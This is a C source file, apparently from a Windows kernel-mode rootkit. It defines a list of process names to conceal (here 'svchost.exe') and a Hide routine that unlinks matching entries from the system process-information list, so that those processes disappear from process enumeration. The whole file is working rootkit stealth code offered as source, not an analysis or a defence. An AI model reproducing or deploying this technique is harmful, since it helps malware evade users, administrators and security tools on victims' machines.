#include "hide/process/processhider_algorithm.h"

#include <ntddk.h>

#include "dbgutils.h"


s_ProcessHideEntry processes_to_hide[] = {
    { 11, L"svchost.exe" }
};

int is_in_processes_to_hide(PUNICODE_STRING process_name)
{
    static size_t processes_to_hide_len = sizeof(processes_to_hide) / sizeof(processes_to_hide[0]);

    size_t len;

    for( size_t i = 0; i < processes_to_hide_len; ++i )
    {
        len = min(process_name->Length, processes_to_hide[i].process_name_len);

        if( 0 == wcsncmp(process_name->Buffer, processes_to_hide[i].process_name, len) )
            return ( 1 );
    }

    return ( 0 );
}

NTSTATUS Hide(SYSTEM_PROCESS_INFORMATION_DETAILD *SystemInformation)
{
    SYSTEM_PROCESS_INFORMATION_DETAILD *curr = SystemInformation;
    SYSTEM_PROCESS_INFORMATION_DETAILD *prev = NULL;

    if( 0 == curr->NextEntryOffset && is_in_processes_to_hide(&(curr->ImageName)) )
        return ( STATUS_UNSUCCESSFUL );

    prev = curr;
    curr = (PVOID)curr + curr->NextEntryOffset;

    while( 1 )
    {
        if( is_in_processes_to_hide(&(curr->ImageName)) )
        {
            if( 0 == curr->NextEntryOffset ) // Last entry
            {
                prev->NextEntryOffset = 0;
                break;
            }
            else
                prev->NextEntryOffset += curr->NextEntryOffset;
        }
        else
        {
            prev = curr;
        }

        if( 0 != curr->NextEntryOffset )
            curr = (PVOID)curr + curr->NextEntryOffset;
        else
            break;
    }

    return ( STATUS_SUCCESS );
}
